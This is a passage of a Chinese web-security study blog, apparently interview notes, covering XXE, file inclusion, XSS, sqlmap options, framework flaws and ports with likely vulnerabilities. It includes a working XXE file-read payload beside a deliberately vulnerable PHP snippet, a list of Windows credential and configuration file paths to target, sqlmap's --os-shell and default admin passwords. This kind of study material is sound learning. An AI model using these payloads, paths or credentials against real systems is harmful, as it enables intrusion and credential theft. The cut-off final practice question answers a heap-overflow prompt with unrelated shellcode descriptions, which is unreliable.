title=\"4.XXE漏洞\"></a>4.XXE漏洞</h3><p><strong>XXE漏洞原理</strong></p>\n<blockquote>\n<p>XXE全称为XML External Entity Injection即XMl外部实体注入漏洞</p>\n</blockquote>\n<p>XXE漏洞触发点往往是可以上传xml文件的位置，没有对xml文件进行过滤，导致可加载恶意外部文件和代码，造成任意文件读取，命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害 要了解xxe漏洞，那么一定得先明白基础知识，了解xml文档的基础组成</p>\n<p><strong>XXE漏洞利用</strong></p>\n<p>在php环境下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$xml=simplexml_load_string($_GET[&#x27;xml&#x27;]);</span><br><span class=\"line\">print_r($xml);</span><br><span class=\"line\">?&gt;\t</span><br></pre></td></tr></table></figure>\n\n<p>将以下xml代码进行URL编码，读取文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE playwin [</span><br><span class=\"line\">&lt;!ENTITY name SYSTEM &quot;file:///D:/phpStudy/PHPTutorial/WWW/1.txt&quot;&gt;</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;resume&gt;</span><br><span class=\"line\">&lt;name&gt; &amp;name; &lt;/name&gt;</span><br><span class=\"line\">&lt;/resume&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p><strong>Xxe漏洞支持的伪协议</strong></p>\n<p>不同的程序支持协议不同</p>\n<h3 id=\"5-文件包含漏洞\"><a href=\"#5-文件包含漏洞\" class=\"headerlink\" title=\"5.文件包含漏洞\"></a>5.文件包含漏洞</h3><p><strong>文件包含的函数</strong></p>\n<p>php中有四种</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">require() // 只在执行到此函数时才去包含文件，若包含的文件不存在产生警告，程序继续运行</span><br><span class=\"line\"></span><br><span class=\"line\">require_once() // 如果一个文件已经被包含过，则不会在包含它</span><br><span class=\"line\"></span><br><span class=\"line\">include() // 程序一运行文件便会包含进来，若包含文件不存在产生致命错误，程序终止运行</span><br><span class=\"line\"></span><br><span class=\"line\">include_once() // 如果一个文件已经被包含过，则不会在包含它</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>文件包含支持的伪协议</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php的支持</span><br><span class=\"line\">php://filter</span><br><span class=\"line\">php://input</span><br><span class=\"line\">file://</span><br><span class=\"line\">phar://</span><br><span class=\"line\">zip://</span><br><span class=\"line\">data://</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>文件包含利用</strong></p>\n<p>包含日志文件getshell</p>\n<p>包含敏感文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\boot.ini //查看系统版本</span><br><span class=\"line\">C:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS配置文件</span><br><span class=\"line\">C:\\Windows\\repair\\sam //存储系统初次安装的密码</span><br><span class=\"line\">C:\\Program Files\\mysql\\my.ini //Mysql配置</span><br><span class=\"line\">C:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql root</span><br><span class=\"line\">C:\\Windows\\php.ini //php配置信息</span><br><span class=\"line\">C:\\Windows\\my.ini //Mysql配置信息</span><br><span class=\"line\">C:\\Windows\\win.ini //Windows系统的一个基本系统配置文件</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"6-Php命令执行，php代码执行相\"><a href=\"#6-Php命令执行，php代码执行相\" class=\"headerlink\" title=\"6.Php命令执行，php代码执行相\"></a>6.Php命令执行，php代码执行相</h3><p><strong>代码执行相关函数</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assert()</span><br><span class=\"line\">eval()</span><br><span class=\"line\">call_user_func()</span><br><span class=\"line\">call_user_func_array()</span><br><span class=\"line\">preg_replace()  //7.0版本后已经不存在</span><br><span class=\"line\">array_map()</span><br><span class=\"line\">Usort()</span><br></pre></td></tr></table></figure>\n\n<p><strong>命令执行相关函数</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">system()</span><br><span class=\"line\">exec()</span><br><span class=\"line\">passthru()</span><br><span class=\"line\">shell_exec()</span><br><span class=\"line\">poopen()</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"7-XSS漏洞\"><a href=\"#7-XSS漏洞\" class=\"headerlink\" title=\"7.XSS漏洞\"></a>7.XSS漏洞</h3><p><strong>XSS漏洞原理</strong></p>\n<blockquote>\n<p>HTML是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号（&lt;）被看作是HTML标签的开始。当动态页面中插入的内容含有这些特殊字符时，正好你要访问的服务器并没有对用户的输入进行安全方面的验证，用户浏览器会将其误认为是插入了HTML标签，当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞</p>\n</blockquote>\n<p><strong>xss漏洞类型</strong></p>\n<blockquote>\n<p>1.反射型</p>\n<p>反射型 XSS 一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。</p>\n<p>对于访问者而言是一次性的，具体表现在我们把我们的恶意脚本通过 URL 的方式传递给了服务器，而服务器则只是不加处理的把脚本“反射”回访问者的浏览器而使访问者的浏览器执行相应的脚本。反射型 XSS 的触发有后端的参与，要避免反射性 XSS，必须需要后端的协调，后端解析前端的数据时首先做相关的字串检测和转义处理。</p>\n<p>此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。<br>2.存储型</p>\n<p>攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型XSS的危害会更大。</p>\n<p>存储型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。<br>3.DOM型</p>\n<p>客户端的脚本程序可以动态地检查和修改页面内容，而不依赖于服务器端的数据。基于DOM的XSS，也就是web server不参与，仅仅涉及到浏览器的XSS。比如根据用户的例如客户端如从 URL 中提取数据并在本地执行，如果用户在客户端输入的数据包含了恶意的 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到 DOM-based XSS 攻击。需要特别注意以下的用户输入源 document.URL、 location.hash、 location.search、 document.referrer 等。</p>\n</blockquote>\n<p><strong>Dom型xss和反射型xss的区别</strong></p>\n<p>DOM型xss和别的xss最大的区别就是它不经过服务器，仅仅是通过网页本身的JavaScript进行渲染触发的</p>\n<p><strong>Xss漏洞的危害</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.窃取用户Cookie</span><br><span class=\"line\">2.后台增删改文章</span><br><span class=\"line\">3.XSS钓鱼攻击</span><br><span class=\"line\">4.利用XSS漏洞进行传播和修改网页代码</span><br><span class=\"line\">5.XSS蠕虫攻击</span><br><span class=\"line\">6.网站重定向</span><br><span class=\"line\">7.获取键盘记录</span><br><span class=\"line\">8.获取用户信息等</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>XSS漏洞防御</strong></p>\n<blockquote>\n<p>1、对输入和URL参数进行过滤(白名单和黑名单)</p>\n<p>检查用户输入的数据中是否包含一些特殊字符，如&lt;、&gt;、’、“等，发现存在特殊字符，将这些特殊字符过滤或者编码。<br>2、HTML实体编码</p>\n<p>字符串js编码转换成实体html编码的方法（防范XSS攻击）<br><a class=\"link\"   href=\"https://www.cnblogs.com/dearxinli/p/5466286.html\" >https://www.cnblogs.com/dearxinli/p/5466286.html<i class=\"fas fa-external-link-alt\"></i></a><br>3、对输出内容进行编码</p>\n<p>在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。</p>\n</blockquote>\n<h3 id=\"8-常见的解析漏洞\"><a href=\"#8-常见的解析漏洞\" class=\"headerlink\" title=\"8.常见的解析漏洞\"></a>8.常见的解析漏洞</h3><p><strong>Nginx</strong></p>\n<blockquote>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/Spontaneous_0/article/details/129106641\" >https://blog.csdn.net/Spontaneous_0/article/details/129106641<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n<p><strong>Apache</strong></p>\n<blockquote>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/weixin_44174581/article/details/119387616\" >https://blog.csdn.net/weixin_44174581/article/details/119387616<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n<p><strong>lls</strong></p>\n<blockquote>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/weixin_43625577/article/details/91971796\" >https://blog.csdn.net/weixin_43625577/article/details/91971796<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n<h3 id=\"9-常见的漏扫工具支持扫描的漏洞类型\"><a href=\"#9-常见的漏扫工具支持扫描的漏洞类型\" class=\"headerlink\" title=\"9.常见的漏扫工具支持扫描的漏洞类型\"></a>9.常见的漏扫工具支持扫描的漏洞类型</h3><p> <strong>Xray</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XSS漏洞检测 (key: xss)</span><br><span class=\"line\">SQL 注入检测 (key: sqldet)</span><br><span class=\"line\">命令/代码注入检测 (key: cmd-injection)</span><br><span class=\"line\">目录枚举 (key: dirscan)</span><br><span class=\"line\">路径穿越检测 (key: path-traversal)</span><br><span class=\"line\">XML 实体注入检测 (key: xxe)</span><br><span class=\"line\">文件上传检测 (key: upload)</span><br><span class=\"line\">弱口令检测 (key: brute-force)</span><br><span class=\"line\">jsonp 检测 (key: jsonp)</span><br><span class=\"line\">ssrf 检测 (key: ssrf)</span><br><span class=\"line\">基线检查 (key: baseline)</span><br><span class=\"line\">任意跳转检测 (key: redirect)</span><br><span class=\"line\">CRLF 注入 (key: crlf-injection)</span><br><span class=\"line\">Struts2 系列漏洞检测 (高级版，key: struts)</span><br><span class=\"line\">Thinkphp系列漏洞检测 (高级版，key: thinkphp)</span><br><span class=\"line\">POC 框架 (key: phantasm)</span><br></pre></td></tr></table></figure>\n\n<p>Avws</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.WebScanner：全站扫描，Web安全漏洞扫描</span><br><span class=\"line\">2.Site Crawler：爬虫功能，遍历站点目录结构</span><br><span class=\"line\">3.Target Finder：端口扫描，找出web服务器</span><br><span class=\"line\">4.Subdomain Scanner：子域名扫描器，利用DNS查询</span><br><span class=\"line\">5.Blind SQL Injector：盲注工具</span><br><span class=\"line\">6.HTTP Editor：http协议数据包编辑器</span><br><span class=\"line\">7.HTTP Sniffer：HTTP协议嗅探器</span><br><span class=\"line\">8.HTTP Fuzzer：模糊测试工具</span><br><span class=\"line\">9.Authentication Tester：Web认证破解工具</span><br><span class=\"line\">10.Web Srevice Scanner：Web服务扫描器</span><br><span class=\"line\">11.Web Srevice Editor：Web服务编辑器</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"10-sqlmap工具参数的使用和含义\"><a href=\"#10-sqlmap工具参数的使用和含义\" class=\"headerlink\" title=\"10.sqlmap工具参数的使用和含义\"></a>10.sqlmap工具参数的使用和含义</h3><ul>\n<li><code>-v</code> 显示信息的级别，一共有六级：0：只显示python 错误和一些严重信息；1：显示基本信息（默认）；2：显示debug信息；3：显示注入过程的payload；4：显示http请求包；5：显示http响应头；7：显示http相应页面</li>\n<li><code>-u</code>指定一个url连接，url中必须要有 <code>?xx=xxx</code> 才行</li>\n<li><code>-r</code>可以呀将一个post请求方式的数据保存在一个txt中msqlmap会通过post方式检验目标</li>\n<li><code>--data=Data</code>指明参数是哪些。例：<code>-u &quot;www.abc.com/index.php?id=1&quot; --data=&quot;name=1&amp;pass=2&quot;</code></li>\n<li><code>--random-agent</code>使用随机user-agent进行测试。sqlmap有一个文件中储存了各种各样的user-agent，文件在<code>sqlmap/txt/user-agent.txt</code> <strong>在level&gt;&#x3D;3时会检测user-agent注入。</strong></li>\n<li><code>--os-shell</code>创建一个对方操作系统的shell，metepreter或VNC</li>\n<li><code>--cookie</code>指定测试时使用的cookie，通常在一些需要登录的站点会使用。例： <code>-u &quot;www.abc.com/index.php?id=1&quot;</code></li>\n</ul>\n<h3 id=\"11-一些常见漏洞\"><a href=\"#11-一些常见漏洞\" class=\"headerlink\" title=\"11.一些常见漏洞\"></a>11.一些常见漏洞</h3><h5 id=\"Tomcat\"><a href=\"#Tomcat\" class=\"headerlink\" title=\"Tomcat\"></a><strong>Tomcat</strong></h5><p>任意命令执行</p>\n<p><a class=\"link\"   href=\"https://zhuanlan.zhihu.com/p/137686820\" >https://zhuanlan.zhihu.com/p/137686820<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"iis\"><a href=\"#iis\" class=\"headerlink\" title=\"iis\"></a>iis</h5><p>目录解析漏洞</p>\n<p>文件名解析漏洞</p>\n<p>畸形解析漏洞</p>\n<p>iis短文件漏洞</p>\n<p>PUT任意文件写入</p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/weixin_42918771/article/details/105178309\" >https://blog.csdn.net/weixin_42918771/article/details/105178309<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"apache\"><a href=\"#apache\" class=\"headerlink\" title=\"apache\"></a>apache</h5><p>换行解析漏洞，多后缀解析漏洞，http路径穿越漏洞</p>\n<p>，路径穿越漏洞</p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/weixin_44268918/article/details/129129214\" >https://blog.csdn.net/weixin_44268918/article/details/129129214<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong>Fastbin</strong></p>\n<p>跟pwn有关，暂时没弄懂</p>\n<p><a class=\"link\"   href=\"https://www.freebuf.com/articles/web/263598.html\" >https://www.freebuf.com/articles/web/263598.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"12-Cobalt-strike-mimikatz工具的一些基础知识\"><a href=\"#12-Cobalt-strike-mimikatz工具的一些基础知识\" class=\"headerlink\" title=\"12.Cobalt strike,mimikatz工具的一些基础知识\"></a>12.Cobalt strike,mimikatz工具的一些基础知识</h3><p>太多了，附上一个链接</p>\n<p><a class=\"link\"   href=\"https://www.freebuf.com/articles/network/290134.html\" >https://www.freebuf.com/articles/network/290134.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"13-常见框架漏洞\"><a href=\"#13-常见框架漏洞\" class=\"headerlink\" title=\"13.常见框架漏洞\"></a>13.常见框架漏洞</h3><h5 id=\"Jboss\"><a href=\"#Jboss\" class=\"headerlink\" title=\"Jboss\"></a>Jboss</h5><ul>\n<li><strong>访问控制不严导致的漏洞</strong></li>\n<li><strong>反序列化导致的漏洞</strong></li>\n</ul>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/m0_58434634/article/details/117434173\" >https://blog.csdn.net/m0_58434634/article/details/117434173<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"weblogic\"><a href=\"#weblogic\" class=\"headerlink\" title=\"weblogic\"></a>weblogic</h5><ul>\n<li>弱口令漏洞</li>\n<li>任意文件上传漏洞</li>\n<li>XML Decoder反序列化漏洞</li>\n<li>webligic-SSRF漏洞</li>\n<li>java反序列化漏洞</li>\n</ul>\n<p><a class=\"link\"   href=\"https://www.cnblogs.com/-mo-/p/11503707.html\" >https://www.cnblogs.com/-mo-/p/11503707.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"thinkphp\"><a href=\"#thinkphp\" class=\"headerlink\" title=\"thinkphp\"></a>thinkphp</h5><ul>\n<li>远程代码执行漏洞</li>\n</ul>\n<p><a class=\"link\"   href=\"https://www.cnblogs.com/lingzhisec/p/15728886.html\" >https://www.cnblogs.com/lingzhisec/p/15728886.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"Struts2\"><a href=\"#Struts2\" class=\"headerlink\" title=\"Struts2\"></a>Struts2</h5><p><a class=\"link\"   href=\"https://blog.csdn.net/HBohan/article/details/122667891\" >https://blog.csdn.net/HBohan/article/details/122667891<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"Shiro\"><a href=\"#Shiro\" class=\"headerlink\" title=\"Shiro\"></a>Shiro</h5><ul>\n<li>反序列化漏洞</li>\n</ul>\n<p><a class=\"link\"   href=\"https://www.freebuf.com/vuls/283810.html\" >https://www.freebuf.com/vuls/283810.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"14-常见端口对应的漏洞\"><a href=\"#14-常见端口对应的漏洞\" class=\"headerlink\" title=\"14.常见端口对应的漏洞\"></a>14.常见端口对应的漏洞</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">20：FTP服务的数据传输端口</span><br><span class=\"line\">21：FTP服务的连接端口，可能存在  弱口令暴力破解</span><br><span class=\"line\">22：SSH服务端口，可能存在 弱口令暴力破解</span><br><span class=\"line\">23：Telnet端口，可能存在 弱口令暴力破解</span><br><span class=\"line\">25：SMTP简单邮件传输协议端口，和 POP3 的110端口对应</span><br><span class=\"line\">43：whois服务端口</span><br><span class=\"line\">53：DNS服务端口(TCP/UDP 53)</span><br><span class=\"line\">67/68：DHCP服务端口</span><br><span class=\"line\">69：TFTP端口，可能存在弱口令</span><br><span class=\"line\">80：HTTP端口，常见web漏洞</span><br><span class=\"line\">88：Kerberos协议端口</span><br><span class=\"line\">110：POP3邮件服务端口，和SMTP的25端口对应</span><br><span class=\"line\">135：RPC服务</span><br><span class=\"line\">137/138： NMB服务</span><br><span class=\"line\">139：SMB/CIFS服务</span><br><span class=\"line\">143：IMAP协议端口</span><br><span class=\"line\">161/162: Snmp服务，public弱口令</span><br><span class=\"line\">389：LDAP目录访问协议，有可能存在注入、弱口令，域控才会开放此端口</span><br><span class=\"line\">443：HTTPS端口，心脏滴血等与SSL有关的漏洞</span><br><span class=\"line\">445：SMB服务端口，可能存在永恒之蓝漏洞MS17-010</span><br><span class=\"line\">512/513/514：Linux Rexec服务端口，可能存在爆破</span><br><span class=\"line\">636：LDAPS目录访问协议，域控才会开放此端口</span><br><span class=\"line\">873：Rsync ，可能存在Rsync未授权访问漏洞，传送门：rsync 未授权访问漏洞</span><br><span class=\"line\">1080：socket端口，可能存在爆破</span><br><span class=\"line\">1099：RMI，可能存在 RMI反序列化漏洞</span><br><span class=\"line\">1352：Lotus domino邮件服务端口，可能存在弱口令、信息泄露</span><br><span class=\"line\">1414：IBM WebSphere MQ服务端口</span><br><span class=\"line\">1433：SQL Server对外提供服务端口</span><br><span class=\"line\">1434：用于向请求者返回SQL Server使用了哪个TCP/IP端口</span><br><span class=\"line\">1521：oracle数据库端口</span><br><span class=\"line\">2049：NFS服务端口，可能存在NFS配置不当</span><br><span class=\"line\">2181：ZooKeeper监听端口，可能存在 ZooKeeper未授权访问漏洞</span><br><span class=\"line\">2375：Docker端口，可能存在 Docker未授权访问漏洞</span><br><span class=\"line\">2601:   Zebra ，默认密码zebr</span><br><span class=\"line\">3128:   squid ，匿名访问（可能内网漫游)</span><br><span class=\"line\">3268：LDAP目录访问协议，有可能存在注入、弱口令</span><br><span class=\"line\">3306：MySQL数据库端口，可能存在 弱口令暴力破解</span><br><span class=\"line\">3389：Windows远程桌面服务，可能存在 弱口令漏洞 或者 CVE-2019-0708 远程桌面漏洞复现</span><br><span class=\"line\">3690：SVN服务，可能存在SVN泄漏，未授权访问漏洞</span><br><span class=\"line\">4440：Rundeck，弱口令admin</span><br><span class=\"line\">4560：log4j SocketServer监听的端口，可能存在 log4j&lt;=1.2.17反序列化漏洞（CVE-2019-17571）</span><br><span class=\"line\">4750：BMC，可能存在 BMC服务器自动化RSCD代理远程代码执行(CVE-2016-1542)</span><br><span class=\"line\">4848：GlassFish控制台端口，可能存在弱口令admin/adminadmin</span><br><span class=\"line\">5000：SysBase/DB2数据库端口，可能存在爆破、注入漏洞</span><br><span class=\"line\">5432：PostGreSQL数据库的端口</span><br><span class=\"line\">5632：PyAnywhere服务端口，可能存在代码执行漏洞</span><br><span class=\"line\">5900/5901：VNC监听端口，可能存在 VNC未授权访问漏洞</span><br><span class=\"line\">5984：CouchDB端口，可能存在 CouchDB未授权访问漏洞</span><br><span class=\"line\">6379：Redis数据库端口，可能存在Redis未授权访问漏洞，传送门：Redis未授权访问漏洞</span><br><span class=\"line\">7001/7002：Weblogic，可能存在Weblogic反序列化漏洞，传送门：Weblogic反序列化漏洞</span><br><span class=\"line\">7180：Cloudera manager端口</span><br><span class=\"line\">8000：JDWP，可能存在JDWP远程代码执行漏洞。</span><br><span class=\"line\">8069：Zabbix服务端口，可能存在Zabbix弱口令导致的Getshell漏洞</span><br><span class=\"line\">8080：Tomcat、JBoss，可能存在Tomcat管理页面弱口令Getshell，JBoss未授权访问漏洞，传送门：Tomcat管理弱口令页面Getshell</span><br><span class=\"line\">8080-8090：可能存在web服务</span><br><span class=\"line\">8089：Jetty、Jenkins服务端口，可能存在反序列化，控制台弱口令等漏洞</span><br><span class=\"line\">8161：Apache ActiveMQ后台管理系统端口，默认口令密码为：admin:admin ，可能存在CVE-2016-3088漏洞，传送门：Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）</span><br><span class=\"line\">9000：fastcgi端口，可能存在远程命令执行漏洞</span><br><span class=\"line\">9001：Supervisord，可能存在Supervisord远程命令执行漏洞(CVE-2017-11610)，传送门：Supervisord远程命令执行漏洞(CVE-2017-11610)</span><br><span class=\"line\">9043/9090：WebSphere，可能存在WebSphere反序列化漏洞</span><br><span class=\"line\">9200/9300：Elasticsearch监听端口，可能存在 Elasticsearch未授权访问漏洞</span><br><span class=\"line\">10000：Webmin-Web控制面板，可能存在弱口令</span><br><span class=\"line\">10001/10002：JmxRemoteLifecycleListener监听的，可能存在Tomcat反序列化漏洞，传送门：Tomcat反序列化漏洞(CVE-2016-8735)</span><br><span class=\"line\">11211：Memcached监听端口，可能存在 Memcached未授权访问漏洞</span><br><span class=\"line\">27017/27018：MongoDB数据库端口，可能存在 MongoDB未授权访问漏洞</span><br><span class=\"line\">50000：SAP Management Console服务端口，可能存在 运程命令执行漏洞。</span><br><span class=\"line\">50070：Hadoop服务端口，可能存在 Hadoop未授权访问漏洞</span><br><span class=\"line\">61616：Apache ActiveMQ服务端口，可能存在 Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）复现</span><br><span class=\"line\">60020：hbase.regionserver.port，HRegionServer的RPC端口</span><br><span class=\"line\">60030：hbase.regionserver.info.port，HRegionServer的http端口</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"15-一些最新的漏洞\"><a href=\"#15-一些最新的漏洞\" class=\"headerlink\" title=\"15.一些最新的漏洞\"></a>15.一些最新的漏洞</h3><h5 id=\"Log4j2\"><a href=\"#Log4j2\" class=\"headerlink\" title=\"Log4j2\"></a>Log4j2</h5><p><a class=\"link\"   href=\"https://juejin.cn/post/7202514143341002789\" >https://juejin.cn/post/7202514143341002789<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"spring-core-rce-2022-03-29\"><a href=\"#spring-core-rce-2022-03-29\" class=\"headerlink\" title=\"spring-core-rce-2022-03-29\"></a>spring-core-rce-2022-03-29</h5><p><a class=\"link\"   href=\"https://blog.csdn.net/weixin_45632448/article/details/124190382\" >https://blog.csdn.net/weixin_45632448/article/details/124190382<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"16-常见的web漏洞\"><a href=\"#16-常见的web漏洞\" class=\"headerlink\" title=\"16.常见的web漏洞\"></a>16.常见的web漏洞</h3><ul>\n<li>任意文件上传</li>\n<li>任意文件下载</li>\n<li>逻辑漏洞</li>\n<li>反序列化漏洞</li>\n</ul>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h2 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h2><hr>\n<h1 id=\"练习思考题\"><a href=\"#练习思考题\" class=\"headerlink\" title=\"练习思考题\"></a>练习思考题</h1><h3 id=\"1-堆溢出覆盖top-chunk的大小-house-of-force-的说法有哪些？\"><a href=\"#1-堆溢出覆盖top-chunk的大小-house-of-force-的说法有哪些？\" class=\"headerlink\" title=\"1.堆溢出覆盖top chunk的大小(house of force)的说法有哪些？\"></a>1.堆溢出覆盖top chunk的大小(house of force)的说法有哪些？</h3><ol>\n<li>Windows Meterpreter Reverse TCP shellcode：这种 shellcode 可以与 Metasploit 的 Meterpreter 模块配合使用，实现远程代码执行、获取系统信息等功能。</li>\n<li>Windows Reverse TCP shellcode：这种 shellcode 可以在 Windows 系统上运行，将一个远程 shell 